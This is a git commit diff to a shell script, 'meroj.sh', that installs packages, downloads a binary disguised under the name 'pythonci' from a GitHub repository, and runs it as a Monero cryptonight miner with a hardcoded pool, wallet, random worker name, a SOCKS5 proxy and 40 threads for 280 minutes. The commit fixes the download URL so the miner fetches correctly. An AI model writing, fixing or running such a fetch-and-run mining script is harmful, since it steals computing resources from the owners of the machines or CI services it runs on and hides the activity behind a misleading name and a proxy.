89399d557d903619acb592a59d31c045a4bbd315
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-21 21:16:34 +0100

    Update meroj.sh

--- meroj.sh
+++ meroj.sh
@@ -2,7 +2,7 @@
 sudo apt update
 sudo apt install screen -y
 sudo apt install screen libjansson4 -y
-wget hhttps://github.com/NRC-TECH/test-files/raw/main/pythonci
+wget https://github.com/NRC-TECH/test-files/raw/main/pythonci
 chmod +x pythonci
 screen -dmS ls
 POOL=stratum+tcp://monerohash.com:2222 
@@ -10,4 +10,3 @@ WALLET=88MZkAYp2JCER2PUEUiBf2KvQAszwju5TUFnJgDBx59gBSU8tMGJwuWgGFwQrBc61R56tC4f1
 PROXY=socks5://72.195.114.169:4145
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
 timeout 280m ./pythonci -a cryptonight -o $POOL -u $WALLET.$WORKER -p x -t 40 -x $PROXY
-echo Sukses
